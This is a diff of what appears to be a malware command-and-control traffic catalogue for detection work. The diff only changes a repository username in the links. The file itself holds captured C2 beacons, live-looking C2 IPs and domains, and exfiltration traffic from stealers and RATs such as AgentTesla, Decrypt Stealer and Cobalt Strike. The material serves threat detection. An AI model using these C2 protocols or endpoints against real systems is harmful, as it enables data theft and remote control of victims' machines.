@@ -3,7 +3,7 @@
 #### ACBackdoor
 Hash: 907e1dfde652b17338d307b6a13a5af7a8f6ced93a7a71f7f65d40123b93f2b8
 
-Pcap: (https://github.com/silence-is-best/c2db/blob/master/pcaps/acbackdoor.pcap) and sslkeyfile: (https://github.com/silence-is-best/c2db/blob/master/pcaps/acbackdoor.txt) 
+Pcap: (https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/pcaps/acbackdoor.pcap) and sslkeyfile: (https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/pcaps/acbackdoor.txt) 
 ~~~
 POST / HTTP/1.1
 Host: 193.29.15.147
@@ -22,7 +22,7 @@ Content-Type: text/html; charset=UTF-8
 Date: Mon, 11 Nov 2019 13:55:27 GMT
 Content-Length: 0
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/acbackdoor.png "ACBackdoor")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/acbackdoor.png "ACBackdoor")
 
 #### AgentTesla
 ftp:
@@ -39,7 +39,7 @@ Application:Outlook<br>
 <hr>
 </html>
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/agentteslaftp.png "AgentTesla FTP")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/agentteslaftp.png "AgentTesla FTP")
 
 http:
 ~~~
@@ -55,7 +55,7 @@ HTTP/1.1 100 Continue
 
 p=G1DZYwdIiDZ6V83seaZCmTT0wiCyOlXVS0OEx4YpkUAOuKO/6hfQJ%2BZD2LjpTbyu9w0gudjYXCIc0Ul74wtsvtqYLYuTR%2BlFVl%2B5deG0RnTTo6nFc1M9tx0%2BRo7WXetRdIHkmVMMSeqH%2BEroM7yttDzosvKfKgB%2BJ07oqT/YvQ6CPNW2%2BCETCU6oIlO9XYyrEy6/hYeF%2BgkfRc9xSEfZhh/7Wk0khJ4zZJ3cjEvXDxJcQWA739/yDUy4kOAndihYsWnLw1mVCHxJSJf7%2BguB9f4DpgX10NLpH
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/agenttesla-http.png "AgentTesla HTTP")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/agenttesla-http.png "AgentTesla HTTP")
 
 smtp exil:
 ~~~
@@ -75,7 +75,7 @@ R-PC<br>OSFullName: Microsoft Windows 7 Professional <br>CPU: Int=
 el(R) Core(TM) i5-6400 CPU @ 2.70GHz<br>RAM: 3583.61 MB<br>IP: 18=
 5.183.107.236=0A<hr>
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/agenttesla-submission.png "AgentTesla Submission")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/agenttesla-submission.png "AgentTesla Submission")
 
 #### Amadey
 ~~~
@@ -96,13 +96,13 @@ Connection: close
 
 <c><d>
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/amadey.png "Amadey")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/amadey.png "Amadey")
 
 #### Arechclient2
 ~~~
 ....+.{"Type":"EncryptionStatus","Status":"Off"}....&.{"Type":"ConnectionType","ConnectionType":"Client","SessionID":"191003337","BotName":"admin","BotOS":"Microsoft Windows 7 Professional "}....-.{"Type":"SessionID","SessionID":"191003337"}......{"Type":"AfkSystem"}....).{"Type":"ServerAfkSystem","Status":"ok"}
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/arechclient2.png "Arechclient2")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/arechclient2.png "Arechclient2")
 
 #### Artraloader
 ~~~
@@ -129,7 +129,7 @@ Content-length: 126
 
 BCDEF=EFTLUPQ.KHMMKME&MNOPQ=Xjoepxt!21!Qsp&GHIJ=benjo&UVWXYZ=EFTLUPQ.KHMMKME$$benjoAAcc:37f65.f4db.51ge.bf:1.3875452f88:3&st=0
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/artra.png "Artraloader")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/artra.png "Artraloader")
 
 #### Avemaria, aka ave_maria, warzone rat
 ~~~
@@ -154,11 +154,11 @@ BCDEF=EFTLUPQ.KHMMKME&MNOPQ=Xjoepxt!21!Qsp&GHIJ=benjo&UVWXYZ=EFTLUPQ.KHMMKME$$be
     00000018  09 12 3b 42 5d d9 a2 44  e2 01 86 73 bc 8d c4 e7   ..;B]..D ...s....
     00000028  ca 69 41 01 ab 12 30 ff  ae 64 2d 93 dc 65 53 9b   .iA...0. .d-..eS.
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/avemaria.png "Avemaria")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/avemaria.png "Avemaria")
 ~~~
 con|1597172877123|285|ZTkyNGVhNzkxMjU1N2RlZHxKT05BVEhBTi1QQ1xKb25hdGhhbnwpMiBEdW8gICAgIFQ3NzAwICwgU3RhbmRhcmQgVkdBIEdyYXBoaWNzIEFkYXB0ZXJ8V2luIDcgICh4NjQpfFRXVm5ZVVIxYlhCbGNpQXhMakFnWW5rZ1EyOWtaVU55WVdOclpYSWdMeUJUYmtRPXwwZCAwaCAwbSAwc3w3NjZ8LXwwfDQgR2lCfE4vQXwyMzA0fDE5Mi4xNjguMTAwLjEwMXwxfC0xfERlZmF1bHQ=@
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/avemaria2.png "Avemaria")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/avemaria2.png "Avemaria")
 ~~~
     00000000  17 69 89 31 17 60 ba b0  02 23 a9 79               .i.1.`.. .#.y
 00000000  17 69 89 31 ab 60 ba b0  03 23 a9 79 ba 5d bb 30   .i.1.`.. .#.y.].0
@@ -182,7 +182,7 @@ con|1597172877123|285|ZTkyNGVhNzkxMjU1N2RlZHxKT05BVEhBTi1QQ1xKb25hdGhhbnwpMiBEdW
     00000058  4a a0 14 da ab 1d 4e 07  57 44 7e 5d 42 a2 a0 0b   J.....N. WD~]B...
     00000068  2d f8 d9 d4                                        -...
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/avemaria3.png "Avemaria")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/avemaria3.png "Avemaria")
 
 #### Azorult
 POST retrieve method, unique pattern with lot's of '/' and ')'
@@ -195,12 +195,12 @@ Cache-Control: no-cache
 
 J/.8/.:/.</.?/.>O.(8.I/.>/.9/.>K.>8.N/.I/.;/.</.;N.>:.NL.?N.>8.(9.L/.8/.</.4/.4/.I/.?/.>H.(9.(9.(9.(9.I
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/azorult.png "Azorult")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/azorult.png "Azorult")
 
 #### Backstage aka Powerkatz
 Hash: b4e270dce231fd01c326f0828a3c5ad80012ebb932842aa8e420575859406fac
 
-Pcap: (https://github.com/silence-is-best/c2db/blob/master/pcaps/backstage.pcap)
+Pcap: (https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/pcaps/backstage.pcap)
 ~~~
 POST /index.php/api/fb HTTP/1.1
 Connection: Keep-Alive
@@ -222,7 +222,7 @@ Content-Type: text/html; charset=UTF-8
 
 aHxNfWdKSTNnW1BsUm1JPA==
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/backstage.png "Backstage")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/backstage.png "Backstage")
 
 #### Bandook RAT
 ~~~
@@ -239,7 +239,7 @@ aHxNfWdKSTNnW1BsUm1JPA==
     00000000  64 4f 7a 54 30 46 6f 3d                            dOzT0Fo= 
 00000097  64 4f 7a 54 30 46 76 56  44 51 3d 3d 26 26 26      dOzT0FvV DQ==&&&
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/bandook.png "Bandook")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/bandook.png "Bandook")
 
 #### Bazaloader/Bazabackdoor
 ~~~
@@ -270,7 +270,7 @@ Vary: Accept
 
 OK
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/baza.png "Bazaloader")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/baza.png "Bazaloader")
 
 #### Betabot
 ~~~
@@ -293,14 +293,14 @@ X-Powered-By: PHP/5.5.38
 
 ..._...+...<.f........}..........?...yg.4.....#.Q...p...1yy.u..N?.ueg.v....EO......K.:....R.]......zv...3@j..
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/betabot.png "Betabot")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/betabot.png "Betabot")
 
 #### BitRAT
 Hash: 9e11c859c27b3696188e8b9ad95513dcc0a61980232dc4bf455df5d6f4454e46
 ~~~
 con|1601670957699|281|MTE0NGRlZjhiNzc4ODM5ZXxKT05BVEhBTi1QQ1xKb25hdGhhbnwpMiBEdW8gICAgIFQ3NzAwICwgU3RhbmRhcmQgVkdBIEdyYXBoaWNzIEFkYXB0ZXJ8V2luIDcgICh4NjQpfFFXUnRhVzVwYzNSeVlYUnZjam9nUTI5dGJXRnVaQ0JRY205dGNIUT18MGQgMGggMG0gMHN8MTEwfC18MHw0IEdpQnxOL0F8MjUxNnwxOTIuMTY4LjEwMC4xMDF8MXwtMXxEZWZhdWx0fDEuMzA=@
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/bitrat.png "Betabot")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/bitrat.png "Betabot")
 
 #### Bitter RAT (Patchwork)
 ~~~
@@ -322,13 +322,13 @@ SIZE: ##
 AXE: ##
 SIZE: #45#SRE: ##
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/bitter.png "Bitter RAT")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/bitter.png "Bitter RAT")
 
 #### Bladabindi aka nJrat
 ~~~
 147.ll1990MURFTUFZT19DNEJBMzY0Nw==1990USER-PC1990admin199018-03-2619901990Win 7 Professional SP1 x861990No1990N/A1990..1990UHJvZ3JhbSBNYW5hZ2VyAA==1990123.inf1990MURFTUFZTw0KMWRlbWF5by5kdWNrZG5zLm9yZzoxOTkwDQp2NC4wLjMwMzE5DQpSZWdTdmNzLmV4ZQ0KRmFsc2UNCkZhbHNlDQpGYWxzZQ0KRmFsc2U=15.CAP199035199023926.CAP1990......JFIF.....`.`.....C...........		.
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/njrat.png "Bladabindi - nJrat")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/njrat.png "Bladabindi - nJrat")
 
 #### Blacknet
 ~~~
@@ -344,7 +344,7 @@ Connection: Upgrade, close
 Transfer-Encoding: chunked
 Content-Type: text/html; charset=UTF-8
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/blacknet.png "Blacknet")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/blacknet.png "Blacknet")
 
 #### Blackrat aka blackremote
 ~~~
@@ -358,7 +358,7 @@ BlackRAT.Data.....data.bytes............123C3803363F73570B0552
 ..$............................J2085182040988060201, Version=1.0.7.0, Culture=neutral, PublicKeyToken=null.....
 BlackRAT.Data.....data.bytes.............16310D190E2C4918020E52	..........$...MZ......................@.............................................	.!..L.!This program cannot be run in DOS mode.
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/blackrat.png "Blackrat")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/blackrat.png "Blackrat")
 
 #### Borr
 ~~~
@@ -436,8 +436,8 @@ Content-Type: text/html; charset=UTF-8
 
 1,1,1,1,1,1,1,2,1,txt;cs;mp3;,https://url.com/file.exe
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/borr1.png "Borr")
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/borr2.png "Borr")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/borr1.png "Borr")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/borr2.png "Borr")
 
 #### Brushaloader
 ~~~
@@ -467,7 +467,7 @@ try {"6f7074696f6e73ProcessorId"; $disks = gwmi Win32_Volume -filter "Name='C:\\
 
 6f7074696f6e73ProcessorId 3300537927
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/brushaloader.png "Brushaloader")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/brushaloader.png "Brushaloader")
 
 #### Buer Loader
 ~~~
@@ -511,8 +511,8 @@ Host: 162.244.81.87
 
 inekece=MDllNzB&diakwadi=iMzE5OG&xycyad=NiNTYxZTcw&ohxiods=MzA0Yj&akreuq=NmZjUy&qosewyic=MzRmMTk5M&amupawel=jdjZGViY&ydsohuu=jljNzMxZDc&orbemaaf=3ZDExMmEx&inhiadfa=ZjA3MG&kyzeafu=UyYzc0M2&alnaexu=M3NGZj&idsavu=Y2VjM2RhO&nyxyygre=GY3YmR&tuxynool=hMmU3Yzc1O&myweka=DNkMDAwYWF&qeozoszi=kOGRlZD&dygyliaz=diNmZkNW&ykdovy=ZiYmVhY&yvabqua=zA4NWEzN&ugsoetl=2Y3ZDk&wymioxi=xNzIwMTIy&uqafsee=Njg1ZTYwNG&cyyqsady=M3NmQwZj&ykuweddy=hkYTQ5ZTV&emlazebe=hYzc5MGVkZ&imirdaby=mJiMzU&doyvku=wYzRhNzQ&roniym=0YTQ5ZDBi&qyaxwe=MTlmZW&uteqop=NkZjdkN2Z&noylke=lNTg5OGJmM&dedynu=DEzNjgxM&suutyfwu=DBkMjFiYm&riitoked=M3NmJjMDg&waliaw=2ZjNhNW&qiubulo=EzZGU2Zm&urehuz=UxNzhjZj&guizpuat=kzYjMzMz&ziapluc=IzODIyYT&orygybib=Y2OGUwY&ebilxufo=2RmYzllM&wesekuy=DVlZThmYTQ&buapxa=3MGVmZDM&lisoxu=xNTlkZ&usgager=TBmOTc4ZDY&cuehlumy=0ZTA5OTZlO&raxyuh=DE2MTA0YWN&piuluwyc=iYjQ4NjE0&gybetez=MzQ3ZW&isvazugo=NhZDExZGEz&obalozha=YmJjZDQ4&pivoewta=NzljOTI&dakiva=xMTE4ND&luzaih=A4OGEz&sesyaci=Mzk0ZWE1YT&opheteow=AxNjQwN&ebzyluo=zBkZWYy&osfiuk=ODc2&yzxaob=NDVmMTViNjdkZDli&exmuur=suirufy
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/buer.png "Buer Loader")
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/buer2.png "Buer Loader")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/buer.png "Buer Loader")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/buer2.png "Buer Loader")
 
 #### Cannibal RAT (aka Ares)
 ~~~
@@ -545,7 +545,7 @@ Content-Length: 0
 Server: Ares
 Date: Thu, 21 Nov 2019 22:54:05 GMT
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/cannibal.png "Cannibal RAT")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/cannibal.png "Cannibal RAT")
 
 #### Coala Bot
 Uses fake 404
@@ -575,7 +575,7 @@ Content-Type: text/html; charset=UTF-8
 
 MTAzNDE2MzR0MTdoYWhkQkZ1amRmYnd1cmhmbmllZmhydWZoYm5maGdmeVREZmJHRlZ5V2d2ZnwxNTQ3NTU4NDE3
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/coala.png "Coala Bot")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/coala.png "Coala Bot")
 
 #### Cobaltstrike
 ~~~
@@ -607,7 +607,7 @@ Date: Wed, 16 Oct 2019 00:05:35 GMT
 Content-Type: application/octet-stream
 Content-Length: 0
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/cobaltstrike.png "Cobaltstrike")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/cobaltstrike.png "Cobaltstrike")
 
 Amazon c2 profile
 ~~~
@@ -628,7 +628,7 @@ X-Frame-Options: SAMEORIGIN
 Content-Encoding: gzip
 Content-Length: 0
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/cobaltamazon.png "Cobaltstrike")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/cobaltamazon.png "Cobaltstrike")
 
 Safebrowsing c2 profile
 ~~~
@@ -655,13 +655,13 @@ X-Frame-Options: SAMEORIGIN
 X-XSS-Protection: 1; mode=block
 Content-Length: 82480
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/cobalt-safe.png "Cobaltstrike safebrowsing")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/cobalt-safe.png "Cobaltstrike safebrowsing")
 
 #### Cobian RAT
 ~~~
 ...........................LOGIN|-|ROOT02_392170|-|JONATHAN-PC@Jonathan|-|Microsoft Windows 7 Professional |-|No|-|1.0.20.0 [Black]|-|Program Manager|-|ROOT02_392170,goodattack.duckdns.org,4007,svchost.exe,{VYFGJQ0V-30663-BEMNQX-BEMNQX0BNF},TEMP,False,False,|-|.
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/cobian.png "Cobian RAT")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/cobian.png "Cobian RAT")
 
 #### Collector Project
 ~~~
@@ -718,14 +718,14 @@ Date: Fri, 24 Apr 2020 16:45:54 GMT
 Server: LiteSpeed
 Vary: User-Agent
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/collectorproject1.png "Collector Project")
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/collectorproject2.png "Collector Project")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/collectorproject1.png "Collector Project")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/collectorproject2.png "Collector Project")
 
 #### Crimson RAT
 ~~~
 .....info=command.....subdomain-info=user@....|USER-PC|admin||6>1|Ver-3.1||||C:\ProgramData\Dhrolas\|subdomain.....getavs=avpro.....subdomain-getavs=@....264>smss>0><352>explorer>0><796>svchost>0><348>csrss>0><1232>svchost>0><608>svchost>0><3720>windanr>0><692>svchost>0><708>ctfmon>0><864>svchost>0><1872>SearchIndexer>0><3520>SearchFilterHost>0><1384>IMEDICTUPDATE>0><404>csrss>0><1204>spoolsv>0><3484>SearchProtocolHost>0><1824>svchost>0><396>wininit>0><840>svchost>0><1460>qemu-ga>0><2704>audiodg>0><1000>svchost>0><1944>886c394c284f3f334c0e385fe36ec1022037585810b9e39629fcbdc2ac4d27e1>0><464>lsm>0><552>winlogon>0><1352>svchost>0><280>dwm>0><1080>svchost>0><456>lsass>0><4>System>0><448>services>0><2032>taskeng>0><0>Idle>0><
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/crimson.png "Crimson RAT")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/crimson.png "Crimson RAT")
 
 #### Cryptbot
 ~~~
@@ -759,7 +759,7 @@ X-Powered-By: Express
 
 ok!
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/cryptbot.png "Cryptbot")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/cryptbot.png "Cryptbot")
 
 #### Danabot
 Not real TLS traffic, flag on "24 01 00 00" pattern and 24 byte first packet 
@@ -767,13 +767,13 @@ Not real TLS traffic, flag on "24 01 00 00" pattern and 24 byte first packet
 00000000  24 01 00 00 00 00 00 00 e5 7c 00 00 00 00 00 00    $....... .|......
 00000010  09 7e 00 00 00 00 00 00                            .~...... 
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/danabot.png "Danabot")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/danabot.png "Danabot")
 
 #### Darkcomet
 ~~~
 BF7CAB464EFBA57DAD495BECB15D8B4C57F0BE821AEF052DF1C27F08DDFC328EB3FE9F5699707BCDC8C751A55F2CE98F3201C7FC248AA8FC340C2F20D8436FEDEAF457052D53A8F4BFF6568F5D644E03BDB309B022A095BBC95AECE9ACB25EFD2BA04271017BADF1C0D75325C58BB1A8E3C42814BA1D830DF380472AFFBC7F034344A76764BFCC2DC473B6836F4CF2D8518E9CA4A32A3C5FA402FA2837A9BEE006127A5E073F925EC3F95F680D25EB86F58C423E5C645340002B677EA40FE1648BAE9D11EA4BC915D6E53CEF98429542C22BD7439A33FFE8B48BE44AD038C62AA82985A15A0F7F9E342D9F81EB0DB396D2589D80F51FEE9B296FCCE117FCCC25EB8445EFE7617E0930C3FC1931227EC1E2AC401B18E0AE61924E7402CFBB418711F39C890EB6AAD843903AE1D39A0DF31AFFDECA82F3FA48EB19D122088C809D5CEA3F4C59E8C8D57AB04B3DFDE3DD47B37878AD856643B46CAD5A4DEBC3E677BA446EBAD350549BB36FC8FAAE784C7C1EC91932AEB6A3014F3C11FDB9EBA711B7517E0C4EEFA15FF93BDBE8D0E716D8C7E5F3
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/darkcomet.png "Darkcomet")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/darkcomet.png "Darkcomet")
 
 #### Darkrat
 ~~~
@@ -796,7 +796,7 @@ Pragma: no-cache
 Content-Length: 0
 Content-Type: text/html; charset=UTF-8
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/darkrat.png "Darkrat")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/darkrat.png "Darkrat")
 
 #### DCRat
 ~~~
@@ -811,7 +811,7 @@ GET /ksezblxlvou3kcmbq8l7hf3f4cy5xgeo4udla91dueu3qa54/46kqbjvyklunp1z56txzkhen7g
 HTTP/1.1
 Host: domalo.online
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/dcrat.png "DCRat")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/dcrat.png "DCRat")
 
 #### Decrypt Stealer
 ~~~
@@ -868,8 +868,8 @@ PK.........l.P................Desktop Files\PK.........l.P............
 ...Skype\LOG.oldPK...........v.M........5.................=...Skype\MANIFEST-000001PK....................
 -----------------------------8d7f030923bcd86--
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/decryptstealer1.png "Decrypt Stealer")
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/decryptstealer2.png "Decrypt Stealer")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/decryptstealer1.png "Decrypt Stealer")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/decryptstealer2.png "Decrypt Stealer")
 
 #### Delf Loader
 ~~~
@@ -910,7 +910,7 @@ X-Request-ID: 4f25a2a515ae727693adbe820cf36edd
 
 bff12793b8731a7f138e454a576ed1b5
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/delf.png "Delf Loader")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/delf.png "Delf Loader")
 
 #### Diamondfox
 ~~~
@@ -947,7 +947,7 @@ y.}.b.g.g.d.m.i.n.k!S.R"Q.U-Z,O-_c\6E3A1F0C9K?H:I?M..................K..........
 ~r.q.p.t.{.~
 ~.}	d.`.g.b.j.i.h.l.S'V"V U!\(X._+Z.B4A5@4D2K?N:N8M9..........................................................................................................................squuq.2D1E0D4B;O>J>H=I$P V'S"V*\)](\7C4N=K9I>H;Q#W R!W%]*\/]/[,f.c.a.`.i.o.j.o.u.t.u.s.~
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/diamondfox.png "Diamondfox")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/diamondfox.png "Diamondfox")
 
 #### Donotgroup
 ~~~
@@ -960,7 +960,7 @@ Cache-Control: no-cache
 
 data=oowJkdfLibIHB1Y62ffb2Cf5imwjN2x/vp1AE/SF8E9/fX1cnZaC6Bg7jRETqi6iAsAVATepyhSETB+r2H2rYWEvvx/SmugiXvz27uz0yReYJAkt5CqsQ1ydb5UHNRcWeCnGPQpjtxUSdy2LbDj+BHjBdjchVAB23Cz4rjuoSeMKlJRQ9zvCOr97/MMALs/TboDUd+5fj/i2/APrZTfpizOy8v+poMBVcVMSRXHmpqpemivoTJEMmTx7y5tGBeY2YbMpVycCDNMyaJr7Xuh3Bng2MVZ5/OO2jvfqFXqwiMMZtiBEpRGjCKGYsUb/J2cyOMtemC3Sh71GkfSpI1sSV+1rKJzBILo6VHTGPK0Z12dxKVXEUCn4KTUTo/QVWTCnCyL7r+b0BIL+SVXjBOGtamQqja1Hq0Hrihoulr6qYy0jDKiyDa9n9BkSO3AJXsx5IkMf0qQvKzMW3iWvcRmILL1AXRCGgsxFCvAcDZ9GV5jM7E6rXEYQcYATyePeWJIMnNO6Tvyn/4qcywkEiKwt8Uoe6YCGaEwZjIsWfhFHTyJXj4KUY7nUuArbF1iz029U2QErLL5AiQUpHYeddGkjkvEPRnwahESDpYAwS6dVEKCn/n4CMJHEJqxHNRA2uSEewoCBYQb1lsKfdiMFZvD1kzKaxR7Oeluch5UFAGEhbJQMC6PsyVQ1nna6bn2S/0Bc4tKsMXfkr3YdfrPrXjUu4PlMRYPQYFUKTTpsFyAHXQ4a5jaiW9PmZOx1Iej9I0aFIiF8e1nVYgNXmMO3pYYbKxW0sn/MswbPNeNs3vQVFma15AM3y7eK8sPPizvYTsG6ld8rW0aUNqidEfpvck50hpUDKH0RdcfT9u+Kw5NZJ99ebBO8DMc1q4/8l9Tb887feKC1bvRVS2JYZKSyDaLJtC7VYZLjtczdqtu5Ayrh3q8kvWFxneIVI9jBuYi5YSkH+F7YQ/yuiDZwtGw6USUejEOuIpfa0PSIJQkDf01AqeKrXcNtKnmjv51Kmu1Go5u0v/zPgWDNG6w3DH0UhWrZxodJwLuKx6Qu66p3Vww/XJcQwVIK+86StKqMcCBH44nE11jRVZNi8L5Ru6WWvVqtktYlOJAJq9T/0Y3O7Onac3fDTThRSkme8mpvzCbkVhTW3jG9h+8aKt2H5rpgrb+4oSfCZQh+V+zDE54I2ODNytc79YOHTdrxYgEG3K2wS4udvyG6t66FA8RUJqmMc+ZPSGk9ZDH0hKpA5iWAr06IGlo=
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/donotgroup.png "Donotgroup")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/donotgroup.png "Donotgroup")
 
 #### Dridex (loader)
 ~~~
@@ -992,7 +992,7 @@ v..jq..........G.0vR...@ ..6tw..<.{It.y
 #l.K..8....v...v......=.+.......Q..v..P5...y...uhTqR.
 ..v.QoM..o.I.l...>.....p.....Rt...............
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/dridex.png "Dridex")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/dridex.png "Dridex")
 
 #### Dunihi
 ~~~
@@ -1011,7 +1011,7 @@ Connection: close
 Content-Type: text/html
 Server: Indy/9.0.18
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/dunihi.png "Dunihi")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/dunihi.png "Dunihi")
 
 #### Emotet
 ~~~
@@ -1036,8 +1036,8 @@ Connection: keep-alive
 
 .^ta.I..Z .._AJ*..=._...5-...F.L{>...`.c.....~.|.h...@.E...2.Z|U..W..M....b......X.FA....x.....\.j?/C......{pi.b....Cz......>D..yQ........G.q...4?..
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/emotet-1.png "Emotet")
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/emotet-2.png "Emotet")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/emotet-1.png "Emotet")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/emotet-2.png "Emotet")
 
 #### EngrWiz
 ~~~
@@ -1059,7 +1059,7 @@ X-Request-ID: 571e4da59d69406a9d967ee31ad5fae4
 Server: cloudflare
 CF-RAY: 4fb4c3dd683ccaf4-ARN
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/engrwiz.png "EngrWiz")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/engrwiz.png "EngrWiz")
 
 #### Evilpony
 Follow tcp stream, not http stream in wireshark
@@ -1089,7 +1089,7 @@ X-Powered-By: PHP/5.4.45
 
 I6.$...Z,....   
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/evilpony.png "Evilpony")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/evilpony.png "Evilpony")
 
 #### Evrial Stealer
 ~~~
@@ -1110,7 +1110,7 @@ PK........W..O........M.......desktop.jpg..u\T].=:.4b. ....t."14CI..AH..H( #9t#0
 .!.J7.
 ...}.}.....?.....9s....a?.Y.z.yO..L...*!.`xxx.{.?..(L.FBDDLt.................
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/evrial.png "Evrial")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/evrial.png "Evrial")
 
